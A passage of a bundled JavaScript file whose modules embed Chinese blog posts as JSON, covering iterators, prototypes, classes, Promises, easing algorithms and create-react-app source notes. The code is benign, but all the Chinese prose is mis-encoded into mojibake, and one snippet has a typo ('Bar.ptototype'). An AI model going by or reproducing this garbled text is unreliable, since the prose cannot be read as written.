class=\\"hljs-string\\">\\"bar\\"</span>;\\n\\nmyObjec...</code></pre>","slug":"yi-xie-bei-hu-lve-de-js-zhi-shi-2","sha":"d923bf5ea77aeead80931e8ae800e2382bec4caf"}')},662:function(n){n.exports=JSON.parse('{"content":"<p>ä¸€äº›JSåŸºç¡€(3)</p>\\n<h4 id=\\"forof\\">for...of</h4>\\n<p> <code>for..of</code>ä¼šå¯»æ‰¾å†…ç½®æˆ–è€…è‡ªå®šä¹‰çš„ @@iterator å¯¹è±¡å¹¶è°ƒç”¨å®ƒçš„ next() æ–¹æ³•æ¥éå†æ•°æ®å€¼</p>\\n<p> arrayé»˜è®¤å¸¦æœ‰iteratorï¼Œå› æ­¤å¯ä»¥ç›´æ¥ä½¿ç”¨for...of</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> arr=[<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">3</span>];\\n<span class=\\"hljs-keyword\\">var</span> it=arr[<span class=\\"hljs-built_in\\">Symbol</span>.iterator]()\\n\\nit.next() <span class=\\"hljs-comment\\">// {value: 1, done: false}</span>\\nit.next() <span class=\\"hljs-comment\\">// {value: 2, done: false}</span>\\nit.next() <span class=\\"hljs-comment\\">// {value: 3, done: false}</span>\\nit.next() <span class=\\"hljs-comment\\">// {value: undefined, done: true}</span></code></pre></code></pre>\\n<p>objecté»˜è®¤ä¸å¸¦iteratorï¼Œä¸å¯ä»¥ç›´æ¥ä½¿ç”¨for...ofï¼Œä½†å¯ä»¥æ‰‹åŠ¨æ·»åŠ iteratorå±æ€§å</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> obj={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-attr\\">z</span>:<span class=\\"hljs-number\\">3</span>}\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> key <span class=\\"hljs-keyword\\">of</span> obj){<span class=\\"hljs-built_in\\">console</span>.log(key)} <span class=\\"hljs-comment\\">// TypeError:obj is not iterable</span>\\n\\n<span class=\\"hljs-built_in\\">Object</span>.defineProperty(obj,<span class=\\"hljs-built_in\\">Symbol</span>.iterator,{\\n  <span class=\\"hljs-attr\\">writable</span>:<span class=\\"hljs-literal\\">false</span>,\\n  <span class=\\"hljs-attr\\">enumerable</span>:<span class=\\"hljs-literal\\">false</span>,\\n  <span class=\\"hljs-attr\\">configurable</span>:<span class=\\"hljs-literal\\">true</span>,\\n  <span class=\\"hljs-attr\\">value</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-keyword\\">var</span> curO=<span class=\\"hljs-keyword\\">this</span>;\\n    <span class=\\"hljs-keyword\\">var</span> oId=<span class=\\"hljs-built_in\\">Object</span>.keys(curO);\\n    <span class=\\"hljs-keyword\\">var</span> curIdx=<span class=\\"hljs-number\\">0</span>;\\n    <span class=\\"hljs-keyword\\">return</span>{\\n      <span class=\\"hljs-attr\\">next</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n        <span class=\\"hljs-keyword\\">return</span> {\\n          <span class=\\"hljs-attr\\">value</span>:curO[oId[curIdx++]],\\n          <span class=\\"hljs-attr\\">done</span>:curIdx&gt;oId.length\\n        }\\n      }\\n    }\\n  }\\n})\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> key <span class=\\"hljs-keyword\\">of</span> obj){<span class=\\"hljs-built_in\\">console</span>.log(key)} \\n<span class=\\"hljs-comment\\">// 1</span>\\n<span class=\\"hljs-comment\\">// 2</span>\\n<span class=\\"hljs-comment\\">// 3</span></code></pre></code></pre>\\n<h4 id=\\"forin-he-in\\">for...inå’Œin</h4>\\n<p><code>for(let key in obj){...}</code>æŸ¥æ‰¾çš„å±æ€§å¿…é¡»æ˜¯å¯æšä¸¾çš„ï¼Œåœ¨æ•´ä¸ªåŸå‹é“¾ä¸ŠæŸ¥æ‰¾</p>\\n<p><code>key in obj</code>æŸ¥æ‰¾çš„å±æ€§å¯ä»¥ä¸æ˜¯å¯æšä¸¾çš„ï¼Œåœ¨æ•´ä¸ªåŸå‹é“¾ä¸ŠæŸ¥æ‰¾</p>\\n<h4 id=\\"yuan-xing-lian-ji-cheng\\">åŸå‹é“¾ç»§æ‰¿</h4>\\n<pre><code><pre class=\\"hljs\\"><code>// ES6 ä¹‹å‰éœ€è¦æŠ›å¼ƒé»˜è®¤çš„ Bar.prototype\\nBar.ptototype = Object.create( Foo.prototype );\\n// ES6 å¼€å§‹å¯ä»¥ç›´æ¥ä¿®æ”¹ç°æœ‰çš„ Bar.prototype\\nObject.setPrototypeOf( Bar.prototype, Foo.prototype );</code></pre></code></pre><h4 id=\\"setprototypeofgetprototypeofisprototypeof\\">setPrototypeOf,getPrototypeOf,isPrototypeOf</h4>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> a={<span class=\\"hljs-attr\\">x</span>:<span class=\\"hljs-number\\">1</span>}\\n<span class=\\"hljs-keyword\\">var</span> b={<span class=\\"hljs-attr\\">y</span>:<span class=\\"hljs-number\\">2</span>}\\n\\n<span class=\\"hljs-built_in\\">Object</span>.setPrototypeOf(a,b)\\na.__proto__===b <span class=\\"hljs-comment\\">// true</span>\\n<span class=\\"hljs-built_in\\">Object</span>.getPrototypeOf(a)===a.__proto__ <span class=\\"hljs-comment\\">// true</span>\\nb.isPrototypeOf(a) <span class=\\"hljs-comment\\">// true</span>\\n\\n<span class=\\"hljs-comment\\">/*           null\\n*             | prototype\\n*            Object \\n*  prototype /\\n*           b \\n*            \\\\ prototype \\n*             a\\n* */</span></code></pre></code></pre>\\n<h4 id=\\"class-de-prototype\\">classçš„prototype</h4>\\n<p>å…ˆä¸ç”¨class</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">A</span>(<span class=\\"hljs-params\\">n</span>)</span>{\\n  <span class=\\"hljs-keyword\\">this</span>.id=n\\n}\\nA.prototype.show=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-keyword\\">this</span>.id)\\n}\\n\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-keyword\\">new</span> A(<span class=\\"hljs-number\\">5</span>)\\na.show() <span class=\\"hljs-comment\\">// 5</span></code></pre></code></pre>\\n<p>æ¥ç€æˆ‘ä»¬æ”¹å˜prototypeï¼Œåˆ†2ç§å½¢å¼</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// ä¸€ï¼šæ›´æ”¹prototypeä¸Šçš„å±æ€§</span>\\nA.prototype.show=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"change\\"</span>)\\n}\\na.show() <span class=\\"hljs-comment\\">// change ç”Ÿæ•ˆ</span>\\n\\n<span class=\\"hljs-comment\\">// äºŒï¼šç›´æ¥æ›´æ”¹æ•´ä¸ªprototype</span>\\nA.prototype={\\n  <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"change\\"</span>)\\n  }\\n}\\na.show() <span class=\\"hljs-comment\\">// 5 æœªç”Ÿæ•ˆ</span>\\n<span class=\\"hljs-keyword\\">var</span> a2=<span class=\\"hljs-keyword\\">new</span> A(<span class=\\"hljs-number\\">5</span>)\\na2.show() <span class=\\"hljs-comment\\">// change ç”Ÿæ•ˆ</span></code></pre></code></pre>\\n<p>å†çœ‹class</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-title\\">A</span></span>{\\n  <span class=\\"hljs-keyword\\">constructor</span>(n){\\n    <span class=\\"hljs-keyword\\">this</span>.id=n\\n  }\\n  show(){\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-keyword\\">this</span>.id)\\n  }\\n}\\n<span class=\\"hljs-keyword\\">var</span> a=<span class=\\"hljs-keyword\\">new</span> A(<span class=\\"hljs-number\\">8</span>)\\na.show() <span class=\\"hljs-comment\\">// 8</span></code></pre></code></pre>\\n<p>æ”¹å˜prototype</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// ä¸€ï¼šæ›´æ”¹prototypeä¸Šçš„å±æ€§</span>\\nA.prototype.show=<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"change\\"</span>)\\n}\\na.show() <span class=\\"hljs-comment\\">// change ç”Ÿæ•ˆ</span>\\n\\n<span class=\\"hljs-comment\\">// äºŒï¼šç›´æ¥æ›´æ”¹æ•´ä¸ªprototype</span>\\nA.prototype={\\n  <span class=\\"hljs-attr\\">show</span>:<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"change\\"</span>)\\n  }\\n}\\na.show() <span class=\\"hljs-comment\\">// 8 æœªç”Ÿæ•ˆ</span>\\n<span class=\\"hljs-keyword\\">var</span> a2=<span class=\\"hljs-keyword\\">new</span> A(<span class=\\"hljs-number\\">5</span>)\\na2.show() <span class=\\"hljs-comment\\">// 5 æœªç”Ÿæ•ˆ</span></code></pre></code></pre>\\n<p>ç»“è®ºï¼š</p>\\n<ol>\\n<li>éclassæ¨¡å¼ä¸‹ï¼Œç›´æ¥ä¿®æ”¹æ•´ä¸ªprototypeå¹¶ä¸èƒ½å½±å“å·²ç»åˆ›å»ºçš„å®ä¾‹ï¼Œä½†å¯¹åæ¥åˆ›å»ºçš„å®ä¾‹æœ‰å½±å“</li>\\n<li>classæ¨¡å¼ä¸‹ï¼Œç›´æ¥ä¿®æ”¹æ•´ä¸ªprototypeæ—¢ä¸èƒ½å½±å“å·²ç»åˆ›å»ºå®ä¾‹ï¼Œä¹Ÿä¸èƒ½å½±å“åæ¥åˆ›å»ºçš„å®ä¾‹</li>\\n</ol>\\n","toc":[{"anchor":"forof","level":4,"text":"for...of"},{"anchor":"forin-he-in","level":4,"text":"for...inå’Œin"},{"anchor":"yuan-xing-lian-ji-cheng","level":4,"text":"åŸå‹é“¾ç»§æ‰¿"},{"anchor":"setprototypeofgetprototypeofisprototypeof","level":4,"text":"setPrototypeOf,getPrototypeOf,isPrototypeOf"},{"anchor":"class-de-prototype","level":4,"text":"classçš„prototype"}],"relatedTags":null,"created_at":"2018-06-26","timeArr":[2018,5,26,0,0,0,0],"title":"ä¸€äº›è¢«å¿½ç•¥çš„jsçŸ¥è¯†3","uuid":"0c8cd68f3ca83da85ae41e597f8b4869615a425b","summary":"<p>ä¸€äº›JSåŸºç¡€(3)</p>\\n<h4>for...of</h4>\\n<p><code>for..of</code>ä¼šå¯»æ‰¾å†…ç½®æˆ–è€…è‡ªå®šä¹‰çš„ @@iterator å¯¹è±¡å¹¶è°ƒç”¨å®ƒçš„ next() æ–¹æ³•æ¥éå†æ•°æ®å€¼</p>\\n<p>arrayé»˜è®¤å¸¦æœ‰iteratorï¼Œå› æ­¤å¯ä»¥ç›´æ¥ä½¿ç”¨for...of</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> arr=[<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">3</span>];\\n<span class=\\"hljs-keyword\\">var</span> it=arr[Symbo...</code></pre>","slug":"yi-xie-bei-hu-lve-de-js-zhi-shi-3","sha":"4fd90b9ee966a8e1972197c101a2e960a01d9493"}')},663:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>å¦‚æœå‘ Promise.resolve(..) ä¼ é€’ä¸€ä¸ªçœŸæ­£çš„ Promiseï¼Œå°±åªä¼šè¿”å›åŒä¸€ä¸ª promise<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> p1 = <span class=\\"hljs-built_in\\">Promise</span>.resolve( <span class=\\"hljs-number\\">42</span> );\\n<span class=\\"hljs-keyword\\">var</span> p2 = <span class=\\"hljs-built_in\\">Promise</span>.resolve( p1 );\\np1===p2\\n<span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n</li>\\n</ul>\\n<hr>\\n<ul>\\n<li>Promise.resolve(..) å¯ä»¥æ¥å—ä»»ä½• thenableï¼Œå°†å…¶è§£å°ä¸ºå®ƒçš„é thenable å€¼ã€‚<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> c={\\n<span class=\\"hljs-attr\\">then</span>:<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a,b</span>)=&gt;</span>{\\n  a(<span class=\\"hljs-number\\">5</span>);b(<span class=\\"hljs-string\\">\\"err\\"</span>)}\\n}\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>Promise.resolve( c )\\n.then(\\n  function fulfilled(val){\\n    console.log( &#39;success&#39;,val );\\n  },\\n  function rejected(err){\\n    console.log(&#39;error&#39;,err)\\n  }\\n);\\n// success 5</p>\\n<pre><code><pre class=\\"hljs\\"><code>---------\\n* Deferredæ¨¡å¼\\n\\n```js\\nfunction Deferred() {\\n    this.promise = new Promise((resolve, reject)=&gt;{\\n        this._resolve = resolve;\\n        this._reject = reject;\\n    });\\n}\\nDeferred.prototype.resolve = function (value) {\\n    this._resolve(value);\\n};\\nDeferred.prototype.reject = function (reason) {\\n    this._reject(reason);\\n};\\nvar d=new Deferred()\\nvar obj={}\\nobj.res=d.resolve.bind(d)\\nobj.rej=d.reject.bind(d)\\nobj.rej(124)\\nd.promise.then(v=&gt;console.log(v),err=&gt;console.warn(err)).catch(err=&gt;console.error(err))</code></pre></code></pre><hr>\\n<ul>\\n<li>ç»§æ‰¿prototype<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">A</span>(<span class=\\"hljs-params\\"></span>) </span>{}\\nA.prototype.a = <span class=\\"hljs-number\\">5</span>\\nA.prototype.show = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-number\\">11</span>)\\n}\\nA.prototype.arr = [<span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">2</span>, <span class=\\"hljs-number\\">3</span>, <span class=\\"hljs-number\\">4</span>]\\n</code></pre></code></pre>\\n</li>\\n</ul>\\n<p>function B() {}\\nfor (let k in A.prototype) {\\n  B.prototype[k] = A.prototype[k]\\n}</p>\\n<p>function C() {}\\nC.prototype = Object.create(A.prototype)</p>\\n<p>// Bå’ŒCçš„åŒºåˆ«</p>\\n<p>var b = new B()\\nvar c = new C()</p>\\n<p>b instanceof A // false\\nc instanceof A // true\\n```</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-02","timeArr":[2018,7,2,0,0,0,0],"title":"ä¸€äº›promiseå’Œå…¶ä»–è¡¥ç¼º","uuid":"e1662cfda83fcae8dc160c993bb54ff04956653c","summary":"<ul>\\n<li>å¦‚æœå‘ Promise.resolve(..) ä¼ é€’ä¸€ä¸ªçœŸæ­£çš„ Promiseï¼Œå°±åªä¼šè¿”å›åŒä¸€ä¸ª promise</li>\\n</ul>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> p1 = <span class=\\"hljs-built_in\\">Promise</span>.resolve( <span class=\\"hljs-number\\">42</span> );\\n<span class=\\"hljs-keyword\\">var</span> p2 = <span class=\\"hljs-built_in\\">Promise</span>.resolve( p1 );\\np1===p2\\n<span class=\\"hljs-comment\\">// true</span>\\n</code></pre>","slug":"yi-xie-promise-he-qi-ta-bu-que","sha":"3bfb5149de44ae6b02ce78a91414ebbd9303a277"}')},664:function(n){n.exports=JSON.parse('{"content":"<p><code>anime</code>ç”¨çš„æ˜¯ç¼“åŠ¨ç®—æ³•</p>\\n<p>ç®—æ³•è§„å®šäº†åŠ¨ç”»å½¢å¼ï¼Œéœ€è¦æä¾›æ€»æ¶ˆè€—æ—¶é—´ï¼Œå½“å‰æ¶ˆè€—æ—¶é—´ï¼Œåˆå§‹ä½ç½®ï¼Œç›®æ ‡ä½ç½®</p>\\n<p>ç‰¹ç‚¹ï¼šåŠ¨ç”»çµæ´»æ€§æ›´å¤§,å¯ä»¥æŒ‡å®šä»»æ„çš„æ—¶é—´è€Œå¾—åˆ°å¯¹åº”çš„ä½ç½®ï¼Œå¯ä»¥å®ç°æš‚åœ/ç»§ç»­ï¼ŒåŠ¨ç”»è·³è½¬ï¼ŒåŠ¨ç”»è¿›åº¦æ¡ç­‰</p>\\n<p><code>react-motion</code>ç”¨çš„æ˜¯å¼¹æ€§ç®—æ³•</p>\\n<p>ç®—æ³•è§„å®šäº†å¼¹æ€§å’Œé˜»åŠ›ï¼Œåªè¦æä¾›åˆå§‹ä½ç½®å’Œç›®æ ‡ä½ç½®ï¼Œå³å¯è®¡ç®—å‡ºåŠ¨ç”»</p>\\n<p>ç‰¹ç‚¹ï¼šå¯ä»¥é€šè¿‡è°ƒæ•´å¼¹åŠ›æ˜¯å¦ä¸º0æ¥å®ç°æš‚åœ/ç»§ç»­(å³ä½¿æš‚åœäº†ï¼Œç¨‹åºè¿˜åœ¨å¾ªç¯è°ƒç”¨)ï¼Œå…¶å®è¦å®ç°ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œåªéœ€è¦\\nä¿å­˜å½“å‰é€Ÿåº¦å’Œä½ç½®ï¼Œç„¶åè®©åŠ¨ç”»åœæ­¢ï¼Œç»§ç»­çš„æ—¶å€™è°ƒç”¨ä¹‹å‰ä¿å­˜çš„é€Ÿåº¦å’Œä½ç½®ï¼›ä½†æ— æ³•å®ç°åŠ¨ç”»è¿›åº¦æ¡</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-05","timeArr":[2018,7,5,0,0,0,0],"title":"æºç é˜…è¯»-animeå’Œreact-motionç®—æ³•å·®å¼‚","uuid":"3b4d16a57b6ee44ecffdda18a89a5c0f7cf5808c","summary":"<p><code>anime</code>ç”¨çš„æ˜¯ç¼“åŠ¨ç®—æ³•</p>\\n<p>ç®—æ³•è§„å®šäº†åŠ¨ç”»å½¢å¼ï¼Œéœ€è¦æä¾›æ€»æ¶ˆè€—æ—¶é—´ï¼Œå½“å‰æ¶ˆè€—æ—¶é—´ï¼Œåˆå§‹ä½ç½®ï¼Œç›®æ ‡ä½ç½®</p>\\n<p>ç‰¹ç‚¹ï¼šåŠ¨ç”»çµæ´»æ€§æ›´å¤§,å¯ä»¥æŒ‡å®šä»»æ„çš„æ—¶é—´è€Œå¾—åˆ°å¯¹åº”çš„ä½ç½®ï¼Œå¯ä»¥å®ç°æš‚åœ/ç»§ç»­ï¼ŒåŠ¨ç”»è·³è½¬ï¼ŒåŠ¨ç”»è¿›åº¦æ¡ç­‰</p>\\n<p><code>react-motion</code>ç”¨çš„æ˜¯å¼¹æ€§ç®—æ³•</p>\\n<p>ç®—æ³•è§„å®šäº†å¼¹æ€§å’Œé˜»åŠ›ï¼Œåªè¦æä¾›åˆå§‹ä½ç½®å’Œç›®æ ‡ä½ç½®ï¼Œå³å¯è®¡ç®—å‡ºåŠ¨...</p>","slug":"yuan-ma-yue-du-anime-he-react-motion-suan-fa-cha-yi","sha":"9f1747ec27f36e527867dcc4368704ce642ca78d"}')},665:function(n){n.exports=JSON.parse('{"content":"<blockquote>\\n<p>./creat-react-app/createReactApp.js</p>\\n</blockquote>\\n<h5 id=\\"oseol\\">os.EOL</h5>\\n<pre><code><pre class=\\"hljs\\"><code>ä¸åŒç³»ç»Ÿçš„è¡Œå°¾ç¬¦å·\\n\\n&gt; A string constant defining the operating system-specific end-of-line marker:\\n\\n`\\\\n` on POSIX\\n\\n`\\\\r\\\\n` on Windows</code></pre></code></pre><h5 id=\\"processcwd\\">process.cwd()</h5>\\n<pre><code><pre class=\\"hljs\\"><code>è¿”å›å½“å‰nodeè¿›ç¨‹çš„ç›®å½•\\n\\n&gt; The process.cwd() method returns the current working directory of the Node.js process.</code></pre></code></pre><h5 id=\\"child_processspawn\\">child_process.spawn</h5>\\n<pre><code><pre class=\\"hljs\\"><code>ä½¿ç”¨ç»™å®šçš„ command å’Œ args ä¸­çš„å‘½ä»¤è¡Œå‚æ•°æ¥è¡ç”Ÿä¸€ä¸ªæ–°è¿›ç¨‹\\n\\nä¾‹å¦‚ï¼š\\n```js\\nconst {spawn}=require(\'child_process\');\\nconst a=spawn(\'npm.cmd\',[\'config\',\'list\'])\\na.stdout.on(\'data\', (data) =&gt; {\\n  console.log(`stdout: ${data}`);\\n});\\n```\\n\\næ³¨æ„ï¼Œwindowsä¸‹è¦ä½¿ç”¨npm.cmdï¼Œå¦åˆ™ä¼šæŸ¥æ‰¾ä¸åˆ°npm, \\nhttps://github.com/nodejs/node/issues/3675\\n\\næˆ–è€…ä½¿ç”¨`cross-spawn`</code></pre></code></pre><h5 id=\\"semver\\">semver</h5>\\n<pre><code><pre class=\\"hljs\\"><code>è¿›è¡Œç‰ˆæœ¬å·å¯¹æ¯”ï¼Œå®˜ç½‘ä¾‹å­å¤‡å¿˜\\n```js\\nsemver.valid(\'1.2.3\') // \'1.2.3\'\\nsemver.valid(\'a.b.c\') // null\\nsemver.clean(\'  =v1.2.3   \') // \'1.2.3\'\\nsemver.satisfies(\'1.2.3\', \'1.x || &gt;=2.5.0 || 5.0.0 - 7.2.3\') // true\\nsemver.gt(\'1.2.3\', \'9.8.7\') // false\\nsemver.lt(\'1.2.3\', \'9.8.7\') // true\\nsemver.valid(semver.coerce(\'v2\')) // \'2.0.0\'\\nsemver.valid(semver.coerce(\'42.6.7.9.3-alpha\')) // \'42.6.7\'\\n```</code></pre></code></pre><h5 id=\\"pathdelimiter\\">path.delimiter</h5>\\n<pre><code><pre class=\\"hljs\\"><code>å¯¹ä¸åŒå¹³å°çš„è·¯å¾„è¿›è¡Œåˆ†å‰²æˆæ•°ç»„\\n\\nWindows ä¸Šæ˜¯ ;(åˆ†å·)\\n\\nPOSIX ä¸Šæ˜¯ :(å†’å·)</code></pre></code></pre><h5 id=\\"yi-ge-boolean-de-shi-yong-fang-fa\\">ä¸€ä¸ªBooleançš„ä½¿ç”¨æ–¹æ³•</h5>\\n<pre><code><pre class=\\"hljs\\"><code>`process.env.NODE_PATH.split(path.delimiter).filter(Boolean)`\\n\\nè¿™é‡Œçš„æ„æ€æ˜¯å…ˆå¯¹`NODE_PATH`è¿›è¡Œåˆ†å‰²ï¼Œå†è¿‡æ»¤å‡ºå­˜åœ¨çš„å€¼</code></pre></code></pre>","toc":[{"anchor":"oseol","level":5,"text":"os.EOL"},{"anchor":"processcwd","level":5,"text":"process.cwd()"},{"anchor":"child_processspawn","level":5,"text":"child_process.spawn"},{"anchor":"semver","level":5,"text":"semver"},{"anchor":"pathdelimiter","level":5,"text":"path.delimiter"},{"anchor":"yi-ge-boolean-de-shi-yong-fang-fa","level":5,"text":"ä¸€ä¸ªBooleançš„ä½¿ç”¨æ–¹æ³•"}],"relatedTags":null,"created_at":"2018-07-28","timeArr":[2018,6,28,0,0,0,0],"title":"æºç é˜…è¯»-create-react-appä¸€äº›æ”¶è·(ç¬”è®°å¤‡å¿˜)","uuid":"f433b9ed4007a7781ed42e23c229928ae08ba1d8","summary":"<blockquote>\\n<p>./creat-react-app/createReactApp.js</p>\\n</blockquote>\\n<h5>os.EOL</h5>\\n<pre><code>ä¸åŒç³»ç»Ÿçš„è¡Œå°¾ç¬¦å·\\n\\n&gt; A string constant defining the operating system-specific end-of-line marker:\\n</code></pre>\\n<p>...</p>","slug":"yuan-ma-yue-du-create-react-app-yi-xie-shou-huo-(-bi-ji-bei-wang-)","sha":"fa60cceb50a93e0f44d825b1043da061721c78f2"}')},666:function(n){n.exports=JSON.parse('{"content":"<p>æœ¬æ¬¡è§£æå°†åˆ†ä¸º2ç¯‡æ–‡ç« ï¼Œå½“å‰æ˜¯ç¬¬ä¸€ç¯‡ï¼Œç¬¬äºŒç¯‡åœ¨<a href=\\"./07-21-%E8%A7%A3%E6%9E%90anime%E6%A0%B8%E5%BF%83(2).md\\">è¿™é‡Œ</a></p>\\n<p>å¦å¤–ï¼Œä¸ºäº†èƒ½æ›´å¥½çš„ç†è§£è¿™ä¸ªåº“ï¼Œä¸ªäººå†™äº†ä¸€ä¸ªæ­¤åº“çš„å‹ç¼©ç‰ˆï¼Œå®ç°äº†æ ¸å¿ƒçš„åŠŸèƒ½(ä¸»è¦ä¹Ÿæ˜¯ä¸ºäº†æ›´å¥½ç†è§£æ ¸å¿ƒåŠŸèƒ½)ï¼Œå†…å®¹æ›´å°‘æ–¹ä¾¿é˜…è¯»ï¼Œ\\nåœ°å€åœ¨<a href=\\"https://github.com/stonehank/simplify-anime\\">è¿™é‡Œ</a></p>\\n<hr>\\n<h2 id=\\"jie-shao\\">ä»‹ç»</h2>\\n<p><a href=\\"http://animejs.com/\\">anime</a>ä¸€ä¸ªJSè½»é‡åŠ¨ç”»åº“ï¼Œæ‘’å¼ƒäº†å¸¸è§„çš„<code>left,top</code>å±æ€§ï¼Œå…¨é¢é‡‡ç”¨<code>requestAnimateFrame+CSS3å±æ€§</code>èƒ½å……åˆ†è°ƒç”¨è®¾å¤‡è¿›è¡ŒGPUæ¸²æŸ“ã€‚</p>\\n<p>å®ƒçš„äº®ç‚¹æœ‰ä»¥ä¸‹(ç›´æ¥å¼•ç”¨å®˜ç½‘)ï¼š</p>\\n<blockquote>\\n<ul>\\n<li>Keyframes(å¸§åŠ¨ç”»): Chain multiple animation properties.</li>\\n<li>Timeline(åŒæ­¥åŠ¨ç”»): Synchronize multiple instances together.</li>\\n<li>Playback controls(æš‚åœå›æ”¾åŠŸèƒ½): Play, pause, restart, seek animations or timelines.</li>\\n<li>CSS transforms(CSSåŠ¨ç”»): Animate CSS transforms individually.</li>\\n<li>Function based values(å‡½æ•°å®šä¹‰é…ç½®(æ³¨å…¥äº†å†…éƒ¨å±æ€§)): Multiple animated targets can have individual value.</li>\\n<li>SVG Animations(SVGåŠ¨ç”»): Motion path, line drawing and morphing animations.</li>\\n<li>Easing functions(è‡ªå®šä¹‰è´å¡å°”å‡½æ•°): Use the built in functions or create your own Cubic BÃ©zier curve easing.</li>\\n</ul>\\n</blockquote>\\n<p>è¿™ä¹ˆå¤šäº®ç‚¹ï¼Œå…¶å®å…³é”®å‡½æ•°å°±3~4ä¸ªã€‚</p>\\n<p>å› ä¸ºè¿™é‡Œéƒ½æ˜¯ä½¿ç”¨ç¼“åŠ¨å‡½æ•°ç®—æ³•ï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ <code>åˆå§‹ä½ç½®</code>, <code>ç»“æŸä½ç½®</code>, <code>æŒç»­æ—¶é—´</code>,<code>å·²æ¶ˆè€—çš„æ—¶é—´</code> è®¡ç®—å‡ºå½“å‰æ‰€åœ¨ä½ç½®ã€‚</p>\\n<p><code>åˆå§‹ä½ç½®</code>ã€<code>ç»“æŸä½ç½®</code>å’Œ<code>æŒç»­æ—¶é—´</code>æ˜¯ä½œä¸ºå‚æ•°ä¼ å…¥é…ç½®çš„ï¼Œå› æ­¤è®¡ç®—<code>å·²æ¶ˆè€—æ—¶é—´</code>å°±æ˜¯å®ŒæˆåŠ¨ç”»çš„æ ¸å¿ƒã€‚  </p>\\n<p>ä¸‹é¢å°±æ·±å…¥äº†è§£ä¸‹å®ƒçš„æ ¸å¿ƒã€‚</p>\\n<h2 id=\\"shen-ru-li-jie\\">æ·±å…¥ç†è§£</h2>\\n<p>å…ˆäº†è§£å‡ ä¸ªæ—¶é—´çš„å˜é‡ï¼ŒåŠ¨ç”»éƒ½æ˜¯<code>ç®—æ³•+æ—¶é—´=ä½ç½®</code>è¿™ä¹ˆç®—å‡ºæ¥çš„ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// è®°å½•å½“å‰ä½ç½®æ‰€å¯¹åº”çš„æ—¶é—´ï¼Œæ ¹æ®lastTimeè®¡ç®—</span>\\ninstance.cuurentTime\\n<span class=\\"hljs-comment\\">// è®°å½•å½“å‰ä½ç½®æ‰€æ¶ˆè€—çš„æ—¶é—´</span>\\nengineTime\\n<span class=\\"hljs-comment\\">// è®°å½•ä¸Šä¸€æ¬¡è®¡ç®—å®Œæ¯•èµ‹å€¼åçš„ä½ç½®å¯¹åº”æ—¶é—´</span>\\nlastTime\\n<span class=\\"hljs-comment\\">// 